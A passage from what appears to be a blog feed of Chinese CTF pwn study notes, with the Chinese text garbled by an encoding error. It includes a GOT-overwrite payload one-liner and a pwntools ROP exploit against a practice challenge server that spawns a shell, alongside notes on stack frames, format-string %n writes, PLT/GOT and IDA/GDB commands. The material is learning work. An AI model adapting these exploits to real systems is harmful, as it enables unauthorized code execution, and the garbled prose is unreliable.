ˆå®šä¹‰äº†å˜é‡ä½†æ²¡æœ‰èµ‹åˆå€¼ï¼Œé‚£å®ƒçš„åˆå§‹å€¼å°†æ˜¯ä¸Šæ¬¡æ ˆä¸­çš„ã€‚</p></blockquote><p>ç”±äºgotè¡¨æ˜¯å¯ä»¥é‡å†™çš„ï¼Œå®ƒè®°å½•ç€æˆ‘ä»¬è¦æ‰§è¡Œå‡½æ•°çš„åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å°†ä¸‹æ¬¡è¦æ‰§è¡Œçš„å‡½æ•°åœ°å€æ”¹æˆæˆ‘ä»¬æƒ³è¦å®ƒæ‰§è¡Œçš„å‡½æ•°åœ°å€ã€‚é€šè¿‡<strong>objdump -R passcode</strong>æŸ¥çœ‹gotè¡¨ã€‚å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¦æ”¹å†™å‡½æ•°åœ¨gotè¡¨ä¸­åœ°å€ä¸º  <strong>0x0804a004</strong></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608182629397.png" alt="image-20200608182629397"></p><p>æ‰¾æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°çš„åœ°å€ã€‚ä½¿ç”¨<strong>objdump -d passcode</strong>æŸ¥çœ‹åæ±‡ç¼–ã€‚æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œå‡½æ•°åœ°å€ï¼š<strong>0x080485e3</strong></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608183049831.png" alt="image-20200608183049831"></p><p>åœ°å€æ‰¾åˆ°åï¼Œå¯»æ‰¾ç¬¬ä¸€æ¬¡welcome()å‡½æ•°ä¸­è¾“å…¥çš„å­—ç¬¦ä¸²çš„å“ªä¸€éƒ¨åˆ†ä¼šæ˜¯åé¢login()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå˜é‡çš„å€¼ã€‚å…¶å®å¾ˆç®€å•ï¼Œ2ä¸ªå‡½æ•°æ˜¯åŒä¸€ä¸ªebpï¼Œç¬¬ä¸€ä¸ªå‡½æ•°è¾“å…¥çš„æœ€å4ä¸ªå­—èŠ‚æ•°æ®å°†æ˜¯ç¬¬äºŒä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå˜é‡çš„4ä¸ªå­—èŠ‚æ•°æ®ã€‚ï¼ˆè§£é‡Šèµ·æ¥æœ‰ç‚¹æŠ½è±¡ï¼Œç†è§£äº†å°±å¾ˆç®€å•ï¼‰</p><p>æœ€åæ„é€ å­—ç¬¦ä¸²ï¼Œæ”»å‡»ã€‚ç”±äºç™»å½•åˆ°è¿œç¨‹ç»ˆç«¯é‡Œæ²¡æœ‰æ‰§è¡Œå’Œå†™è„šæœ¬çš„æƒé™ï¼Œç›´æ¥ä½¿ç”¨pythonä¸ç®¡é“å‘½ä»¤ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*96 + '\x04\xa0\x04\x08' + '134514147'"</span> | ./passcode</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608184738940.png" alt="image-20200608184738940"></p><p><strong>æ€»ç»“ï¼š1.2ä¸ªå‘½ä»¤çš„å­¦ä¹  objdump -R æ–‡ä»¶åï¼ˆæŸ¥çœ‹gotè¡¨ï¼‰ ä¸ objdump -d æ–‡ä»¶åï¼ˆæŸ¥çœ‹åæ±‡ç¼–ï¼‰ã€‚2.è¦†å†™gotçš„æ”»å‡»ã€‚</strong></p><h2 id="è®ºå‰‘åœº"><a href="#è®ºå‰‘åœº" class="headerlink" title="è®ºå‰‘åœº"></a>è®ºå‰‘åœº</h2><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><blockquote><p>åˆ©ç”¨æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºçš„èµ°å‘</p></blockquote><p>é¦–å…ˆä½¿ç”¨fileä¸checksecæŸ¥çœ‹ä¸€ä¸‹ï¼Œ64ä¸ºelfæ–‡ä»¶ï¼Œä¸”æ²¡æœ‰å¼€ä»»ä½•ä¿æŠ¤ï¼Œé‚£æ²¡æœ‰canaryï¼Œå°±å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘äº†ã€‚</p><p>idaä¸­çœ‹ä¸€ä¸‹ï¼Œæ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092808030-1591322466624.png" alt="image-20200605092808030"></p><p>ç»§ç»­çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°å¼•ç”¨çš„åœ°æ–¹å‘ç°äº†systemå‘½ä»¤ï¼Œä½†ä¸æ˜¯æ‰“å¼€shellä¹‹ç±»çš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605093020161.png" alt="image-20200605093020161"></p><p>ç”±äºåˆšæ¥è§¦ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½ä¸çŸ¥é“ï¼Œçœ‹äº†writeupï¼Œé•¿çŸ¥è¯†äº†ã€‚ç”±äºé¢˜ä¸­æœ‰ $0 å­—ç¬¦ï¼Œè€Œè¿™å°±æ˜¯ shellæœ¬èº«çš„åç§°ï¼Œå¯ä»¥ç”¨å®ƒå½“ä½œä¼ å…¥çš„systemï¼ˆï¼‰å‡½æ•°çš„å‚æ•°ä½¿ç”¨ã€‚</p><blockquote><p>ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<code>system()</code>ä¼šè°ƒç”¨<code>fork()</code>äº§ç”Ÿå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹æ¥è°ƒç”¨<code>/bin/bash -c string</code>æ¥æ‰§è¡Œå‚æ•°<code>string</code>å­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„å‘½ä»¤ï¼Œæ­¤å‘½ä»¤æ‰§è¡Œå®Œåéšå³è¿”å›åŸè°ƒç”¨çš„è¿›ç¨‹ã€‚</p></blockquote><blockquote><p>64ä½ç¨‹åºä¼ å‚çš„ç‰¹ç‚¹ï¼š<strong>ä½¿ç”¨å¯„å­˜å™¨ä¼ å‚</strong>ï¼Œåˆ†åˆ«ç”¨<code>rdi</code>ã€<code>rsi</code>ã€<code>rdx</code>ã€<code>rcx</code>ã€<code>r8</code>ã€<code>r9</code>æ¥ä¼ é€’å‚æ•°ï¼ˆå‚æ•°ä¸ªæ•°å°äº7çš„æ—¶å€™ï¼‰ã€‚</p></blockquote><p>æ‰€ä»¥è¿™é‡Œè¦å…ˆè®©ç¨‹åºçš„èµ°å‘åˆ° <code>pop edi;ret</code>, è®©ç¬¬ä¸€ä¸ªä¼ å‚å¯„å­˜å™¨å¾—åˆ° $0çš„åœ°å€ï¼Œé‚£åé¢å†é€šè¿‡ret ä½¿systemï¼ˆï¼‰çš„åœ°å€å¼¹å‡ºç»™ eipï¼Œå¾—åˆ°shellã€‚</p><p>å¼€å§‹å·¥ä½œã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095114997.png" alt="image-20200605095114997"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095231700.png" alt="image-20200605095231700"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095322038.png" alt="image-20200605095322038"></p><p>å†™åˆ©ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">edi = <span class="number">0x00000000004007d3</span></span><br><span class="line">bash = <span class="number">0x000000000060111f</span></span><br><span class="line">sys = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(edi) + p64(bash) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°shellã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095503617.png" alt="image-20200605095503617"></p><p><strong>æ€»ç»“ï¼š1.åœ¨æ²¡æœ‰â€˜bin\bashâ€™å­—ç¬¦ä¸²æ—¶çœ‹çœ‹â€™$0â€˜ã€‚2.64ä½ç¨‹åºçš„ä¼ å‚æ–¹å¼ï¼Œå¯„å­˜å™¨é¡ºåºã€‚3.ROPgadgetå·¥å…·çš„ä½¿ç”¨ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnç¬”è®°</title>
      <link href="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/06/03/pwn%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æ ˆçš„å­¦ä¹ ç†è§£"><a href="#æ ˆçš„å­¦ä¹ ç†è§£" class="headerlink" title="æ ˆçš„å­¦ä¹ ç†è§£"></a>æ ˆçš„å­¦ä¹ ç†è§£</h2><p>1.å¯¹äºæ ˆï¼Œä¸»è¦æ˜¯ç¨‹åºè¿è¡Œä¸­ä¿å­˜å‡½æ•°çš„è¿è¡ŒçŠ¶æ€ä¿¡æ¯ï¼Œå‚æ•°åŠå±€éƒ¨å˜é‡ã€‚å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€è¢«ä¿å­˜åœ¨æ ˆå†…ï¼Œè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€è¢«å‹å…¥è°ƒç”¨æ ˆçš„æ ˆé¡¶ï¼›å‡½æ•°è°ƒç”¨ç»“æŸåé€šè¿‡ä¸€äº›åˆ—æŒ‡ä»¤è¿˜åŸè°ƒç”¨å‡½æ•°çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶æ‰§è¡Œè°ƒç”¨å‡½æ•°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><blockquote><p>å…¥æ ˆé¡ºåºï¼š1.å‚æ•° 2.è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆé€šè¿‡ callï¼‰3.è°ƒç”¨å‡½æ•°æ ˆçš„åŸºåœ°å€ï¼ˆebpï¼‰4.è¢«è°ƒç”¨å‡½æ•°éœ€è¦ä½¿ç”¨çš„å±€éƒ¨å˜é‡ã€‚<a id="more"></a></p></blockquote><p>2.ä¸€å¼ å›¾å¯ä»¥å¾ˆæ¸…æ¥šçš„è¡¨ç¤ºå‡ºæ¥ã€‚</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200609114209670.png" alt="image-20200609114209670"></p><p>3.åœ¨idaä¸­çœ‹è¿™ä¸ªä¹Ÿå¾ˆæ˜¯æ–¹ä¾¿ã€‚</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200603141926461.png" alt="image-20200603141926461"></p><blockquote><p>å‡½æ•°è°ƒç”¨ç»“æŸåï¼š1.å…ˆå¼¹å‡ºå±€éƒ¨å˜é‡ï¼ˆmov esp, ebpï¼‰2.æ¥ç€è¿”å›è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆpop ebpï¼‰3.æœ€åå¼¹å‡ºè¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆpop eipï¼‰ã€‚æ­¤æ—¶å‡½æ•°å°±æ¥ç€æ‰§è¡Œè¢«è°ƒç”¨å‡½æ•°åé¢ä¸€æ¡æŒ‡ä»¤ï¼Œå†é‡åˆ°å‡½æ•°è°ƒç”¨ä¹Ÿæ˜¯åŒæ ·çš„æ ˆæ“ä½œã€‚</p><p>åœ¨çœ‹æ±‡ç¼–ä¸­å¯ä»¥å‘ç°ï¼Œç¨‹åºåœ¨æ¯æ¬¡å¼¹å‡ºå±€éƒ¨å˜é‡ä¸ebpéƒ½æ˜¯ä½¿ç”¨ä¸€æ¡æŒ‡ä»¤leaveï¼Œä¹Ÿå°±æ˜¯ mov esp, ebp; pop ebp çš„åŠŸèƒ½ã€‚</p></blockquote><h2 id="å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³"><a href="#å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³" class="headerlink" title="å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³"></a>å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³</h2><p>1.å‡½æ•°ä¼ å‚éƒ½æ˜¯ä»å³å‘å·¦çš„ã€‚å¦‚æœæ˜¯ä»å·¦å‘å³ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p><p>2.æ‹¿ç»å…¸çš„printf(const char *format, argv..)æ¥å‡è®¾ã€‚formatæœ€å…ˆè¿›æ ˆï¼Œä¹‹åæ˜¯å„ä¸ªå‚æ•°è¿›æ ˆï¼Œç„¶åæ˜¯è¢«è°ƒå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè°ƒç”¨å‡½æ•°åŸºåœ°å€ã€‚è¿™ä¸ªæ—¶å€™è¢«è°ƒå‡½æ•°é¦–å…ˆè‚¯å®šæ˜¯è¦æ‰¾åˆ°formatï¼Œä½†æ˜¯åœ¨å®ƒä¸Šé¢è¿˜æœ‰æœªçŸ¥ä¸ªæ•°çš„å‚æ•°ï¼Œæƒ³è¦çŸ¥é“å‚æ•°ä¸ªæ•°åˆå¿…é¡»æ‰¾åˆ°formatï¼Œè¦æ‰¾åˆ°formatåˆå¿…é¡»çŸ¥é“å‚æ•°ä¸ªæ•°ã€‚è¿™æ ·ä»¥æ¥å°±é™·å…¥è¿™æ ·çš„æ­»å¾ªç¯ã€‚</p><p>3.å½“ç„¶ä»å³å¾€å·¦ä¼ å‚å°±ä¸ä¸€æ ·äº†ï¼Œç›´æ¥åŠ å›ºå®šçš„espå°±å¯ä»¥å…ˆæ‰¾åˆ°formatï¼Œå†ä¾æ¬¡æ£€ç´¢å‚æ•°å³å¯ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>1.è§¦å‘æ ¼å¼åŒ–å­—ç¬¦æ¼æ´çš„ä¸»è¦å‡½æ•°æœ‰ï¼šprintfï¼Œsprintfï¼Œfprintfã€‚</p><p>2.printfï¼ˆï¼‰å‡½æ•°åœ¨æ‰§è¡Œæ—¶å¹¶ä¸çŸ¥é“å‚æ•°ä¸ªæ•°ï¼Œå®ƒå†…éƒ¨æœ‰ä¸€ä¸€ä¸ªæŒ‡é’ˆï¼Œç”¨æ¥ç´¢æ£€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯¹äºç‰¹å®šç±»å‹%ï¼Œå°±å»å–ç›¸åº”å‚æ•°çš„å€¼ï¼Œç›´åˆ°ç´¢æ£€åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“æŸã€‚æ‰€ä»¥æ²¡æœ‰å‚æ•°ï¼Œä»£ç ä¹Ÿä¼šå°†format string åé¢çš„å†…å­˜å½“åšå‚æ•°ä»¥16è¿›åˆ¶è¾“å‡ºã€‚è¿™æ ·å°±ä¼šé€ æˆå†…å­˜æ³„éœ²ã€‚</p><p>3.å½“ç„¶ï¼Œè§„èŒƒçš„ä½¿ç”¨printf()ç­‰å‡½æ•°ï¼Œè¿˜æ˜¯ä¸ä¼šé—®é¢˜ã€‚ä¸»è¦å°±æ˜¯åƒ<code>gets(s);printf(s)</code>è¿™æ ·çš„ç”¨æ³•ï¼Œä½¿è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è¾“å…¥æƒäº¤ç»™äº†æˆ‘ä»¬ã€‚</p><p>4.å…¶ä¸­ä¸€ä¸ªé‡è¦çš„æ ¼å¼åŒ–è¯´æ˜ç¬¦ï¼Œä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´åˆ©ç”¨çš„å…³é”®ã€‚<strong>%xn</strong>ï¼Œå°†æˆ‘ä»¬å‰é¢å·²ç»è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°å€¼å†™å…¥åé¢çš„ç¬¬xä¸ªå‚æ•°çš„åœ°å€å†…ã€‚</p><p>5.ä¸€ä¸ªä¾‹å­å¯ä»¥å¾ˆå¥½çš„è¯´æ˜ã€‚</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200605190434500.png" alt="image-20200605190434500"></p><h2 id="pltä¸got"><a href="#pltä¸got" class="headerlink" title="pltä¸got"></a>pltä¸got</h2><p>1.ä»–ä»¬å­˜åœ¨å®è´¨å°±æ˜¯ä¸ºäº†å¯¹ç¨‹åºæ‰€è¦ä½¿ç”¨çš„å…¬å…±å‡½æ•°ï¼ˆåœ¨åŠ¨æ€é“¾æ¥åº“é‡Œï¼‰è¿›è¡Œä¸€ä¸ªé‡å®šä½ï¼Œè¿™å°±å¥½æ¯”PEä¸­çš„è¾“å…¥è¡¨çš„ä¸­çš„åœ°å€ä¿®æ­£ã€‚</p><p>2.å¯¹äºelfæ–‡ä»¶ï¼Œå®ƒåœ¨æ‰§è¡Œä¸€ä¸ªåŠ¨æ€åº“å‡½æ•°å¦‚printfå‡½æ•°æ—¶ï¼Œå…ˆcall printf@pltï¼ˆprintf@pltå…¶å®æ˜¯ä¸€å°æ®µä»£ç çš„é¦–åœ°å€ï¼‰ï¼Œç„¶ååœ¨printf@pltè¿™æ®µä»£ç ä¸­å†åˆ°.got.pltä¸­æ‰¾å‡½æ•°å®é™…çš„åœ°å€æœ€åè·³è½¬ã€‚</p><p>3.é‚£å…¶å® .pltå…¶å®å°±æ˜¯å­˜æ”¾ç€æ‰€è¦ä½¿ç”¨å‡½æ•°çš„ä¿¡æ¯åŠè·³è½¬ï¼Œè€Œæ‰€æœ‰è¦ä½¿ç”¨çš„å‡½æ•°ä¿¡æ¯å°±ç»„æˆäº† .pltè¡¨ã€‚</p><p>4.å¯¹äº.gotè¡¨å°±æ˜¯å­˜åœ¨æ¯ä¸ªæ‰€éœ€è¦çš„å‡½æ•°çš„å®é™…åœ°å€ï¼Œ.got.pltå…¶å®æ˜¯.gotè¡¨çš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>5.æ‰€ä»¥åœ¨pwné¢˜ä¸­ï¼Œæ‰¾åŠ¨æ€åº“å‡½æ•°çš„å®é™…åœ°å€æ—¶è¦ç”¨ elf.got[â€˜å‡½æ•°åç§°â€™]ï¼›æ‰§è¡Œå‡½æ•°çš„åœ°å€ç”¨ elf.plt[â€˜å‡½æ•°åœ°å€â€™]ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ä½¿ç”¨æ€»ç»“</title>
      <link href="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å¹³æ—¶ä½¿ç”¨å·¥å…·çš„çŸ¥è¯†ç‚¹ã€‚<a id="more"></a></p><h2 id="IDAå®ç”¨å¿«æ·é”®"><a href="#IDAå®ç”¨å¿«æ·é”®" class="headerlink" title="IDAå®ç”¨å¿«æ·é”®"></a>IDAå®ç”¨å¿«æ·é”®</h2><ul><li>ç©ºæ ¼ï¼šGraph overview ä¸ Text view ä¹‹é—´ç›¸å…³åˆ‡æ¢</li><li>tapï¼šä¼ªä»£ç ä¸æ±‡ç¼–ä»£ç å¿«é€Ÿåˆ‡æ¢</li><li>alt+tï¼šæœç´¢å­—ç¬¦ä¸²</li><li>shift+eï¼šå°†æ•°æ®ä»¥æŒ‡ä»¤æ–¹å¼æå–å‡ºæ¥</li><li>ctrl+sï¼šæŸ¥çœ‹ç¨‹åºå„ä¸ªæ®µçš„æƒ…å†µ</li><li>uï¼šå–æ¶ˆå®šä¹‰ï¼›aï¼šæ•°æ®è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</li><li>pï¼šæ•°æ®è½¬åŒ–ä¸ºå‡½æ•°</li><li>yï¼šæ”¹å˜æ•°æ®ç±»å‹</li><li>alt+dï¼šæ”¹å˜æ•°æ®ç±»å‹</li><li>alt+aï¼šæ”¹å˜å­—ç¬¦ä¸²çš„æ ·å¼</li><li>?ï¼šè®¡ç®—è¡¨è¾¾å¼</li></ul><h2 id="GDBè„šæœ¬çš„ä½¿ç”¨"><a href="#GDBè„šæœ¬çš„ä½¿ç”¨" class="headerlink" title="GDBè„šæœ¬çš„ä½¿ç”¨"></a>GDBè„šæœ¬çš„ä½¿ç”¨</h2><ol><li><p>æ‰§è¡Œgdbè„šæœ¬æœ‰2ä¸­åæ–¹å¼ï¼Œä¸€ï¼šç›´æ¥è¾“å…¥defienå‘½ä»¤ï¼Œè¾“å…¥æŒ‡ä»¤ï¼Œæœ€åæ‰§è¡Œã€‚äºŒï¼šå•ç‹¬å†™æˆä¸€ä¸ªè„šæœ¬æ–‡ä»¶ä½¿ç”¨ source æ¥æ‰§è¡Œã€‚</p></li><li><p>gdbè„šæœ¬ä¸­çš„ æŸ¥çœ‹å†…å­˜å†…å®¹çš„æ–¹æ³•ï¼šx/&lt;n/f/u&gt; <addr>     nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°ã€‚</addr></p><p>nï¼šæ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œfï¼šè¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå…¶ä¸­ï¼šsï¼šå­—ç¬¦ä¸²æ˜¾ç¤ºï¼Œxï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œdï¼šæŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡</p><p>uï¼šæŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ï¼Œtï¼šæŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œ oï¼šæŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºï¼Œcï¼šæŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p>æœ€åçš„uè¡¨ç¤ºæ¯ä¸ªå•å…ƒçš„å¤§å°ï¼Œå…¶ä¸­ï¼šbè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­— èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚</p><p>å¦‚ï¼š x/127xb  è¡¨ç¤ºå°† 127ä¸ªçš„å•å­—èŠ‚å•å…ƒçš„æ•°æ®æŒ‰16è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå‡ºæ¥ã€‚</p></li><li><p>è„šæœ¬ä¸­çš„ç©ºæ ¼è¦æ±‚ååˆ†ä¸¥æ ¼ã€‚</p></li></ol><h2 id="GDBå¸¸ç”¨å‘½ä»¤"><a href="#GDBå¸¸ç”¨å‘½ä»¤" class="headerlink" title="GDBå¸¸ç”¨å‘½ä»¤"></a>GDBå¸¸ç”¨å‘½ä»¤</h2><ul><li><p>layout+åˆ¶å®šæ˜¾ç¤ºå†…å®¹ï¼šç”¨äºå¯¹æˆ‘ä»¬è¦æ˜¾ç¤ºçš„å†…å®¹è¿›è¡Œåˆ†ä¸€ä¸ªçª—å£æ˜¾ç¤ºï¼Œè¾¾åˆ°ä¸€è¾¹æ‰§è¡Œä¸€è¾¹æ˜¾ç¤ºï¼Œå¦‚ layout asm</p></li><li><p>rï¼šå¼€å§‹è¿è¡Œï¼›cï¼šç»§ç»­è¿è¡Œï¼›siï¼šå•æ­¥æ­¥å…¥ï¼›nï¼šå•æ­¥æ­¥è¿‡ï¼›</p></li><li><p>disassemble mainï¼šæŸ¥çœ‹mainå‡½æ•°ï¼›x/2wx$espï¼šä»¥16è¿›åˆ¶æŸ¥çœ‹$espåœ°å€å¤„2ä¸ªå•ä½çš„å†…å®¹ï¼Œæ¯ä¸ªå•ä½4ä¸ªå­—èŠ‚ï¼ˆä¸Šé¢æœ‰æ€»ç»“ï¼‰</p></li><li><p>i rï¼šæŸ¥çœ‹å¯„å­˜å™¨çš„å€¼ï¼›</p></li><li><p>startiï¼šå¯ä»¥å…ˆå°†ç¨‹åºæ‰“å¼€ï¼Œä½†æ˜¯ä¸è¿è¡Œã€‚</p></li><li><p>info fileï¼šæŸ¥çœ‹æ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¨‹åºå…¥å£ç‚¹</p></li><li><p>layout srcï¼šæ˜¾ç¤ºæºä»£ç ï¼Œlayout asmï¼šæ˜¾ç¤ºæ±‡ç¼–çª—å£</p></li><li><p>layout regsï¼šæ˜¾ç¤ºæºä»£ç /æ±‡ç¼–/å¯„å­˜å™¨çª—å£</p></li><li><p>ctrl+x+1ï¼šä½†çª—å£æ¨¡å¼ï¼Œctrl+x+2ï¼šåŒçª—å£æ¨¡å¼ï¼Œctrl+x+aï¼šå›åˆ°ä¼ ç»Ÿæ¨¡å¼</p></li><li><p>d+ç¼–å·ï¼šåˆ é™¤ç¼–å·å¤„çš„æ–­ç‚¹</p></li><li><p>finishï¼šæ‰§è¡Œåˆ°å½“å‰å‡½æ•°è¿”å›</p></li><li><p>btï¼šæ‰“å°æ ˆå¸§å…³ç³»</p></li><li><p>i bï¼šæŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯</p></li><li><p>gdbè°ƒè¯•æ—¶è¦ä½¿ç”¨shellå¯ä»¥ç›´æ¥è¾“å…¥shellï¼Œä½¿ç”¨å®Œshellè¦å›åˆ°gdbå¯ç›´æ¥è¾“å…¥exitã€‚</p></li></ul><h2 id="å¯¹å¼€å¯äº†PIEä¸”å»æ‰ç¬¦å·è¡¨çš„ç¨‹åºä¸‹æ–­"><a href="#å¯¹å¼€å¯äº†PIEä¸”å»æ‰ç¬¦å·è¡¨çš„ç¨‹åºä¸‹æ–­" class="headerlink" title="å¯¹å¼€å¯äº†PIEä¸”å»æ‰ç¬¦å·è¡¨çš„ç¨‹åºä¸‹æ–­"></a>å¯¹å¼€å¯äº†PIEä¸”å»æ‰ç¬¦å·è¡¨çš„ç¨‹åºä¸‹æ–­</h2><p>åœ¨linuxçš„ /procç›®å½•ä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½ä¼šåœ¨æ­¤ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªè¿›ç¨‹idä¸ºåçš„æ–‡ä»¶å¤¹ï¼Œåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹çš„map_filesï¼Œå­˜å‚¨ç€è¿›ç¨‹åŠ è½½çš„åŸºåœ°å€ä¸åŠ¨æ€é“¾æ¥çš„åœ°å€ä¿¡æ¯ã€‚</p><p>æ‰€ä»¥åˆ©ç”¨ä»¥ä¸Šæ‰¾åˆ°ç¨‹åºçš„åŸºåœ°å€åï¼Œå†é€šè¿‡ä¿®æ”¹idaè½½å…¥çš„åŸºåœ°å€ï¼Œgdbå°±ä¸idaä¸­çœ‹åˆ°çš„åœ°å€å¯¹åº”äº†ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚</p><h2 id="IDAä¸­è¿è¡Œè„šæœ¬-idc-python"><a href="#IDAä¸­è¿è¡Œè„šæœ¬-idc-python" class="headerlink" title="IDAä¸­è¿è¡Œè„šæœ¬(idc python)"></a>IDAä¸­è¿è¡Œè„šæœ¬(idc python)</h2><h3 id="idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€"><a href="#idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€" class="headerlink" title="idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€"></a>idcæ˜¯idaä¸­å†…ç½®çš„è„šæœ¬è¯­è¨€ï¼Œä¸€ç§è§£é‡Šæ€§è¯­è¨€</h3><blockquote><p>è¿è¡Œè„šæœ¬ alt+F7ï¼›å•è¡Œæ‰§è¡Œpython 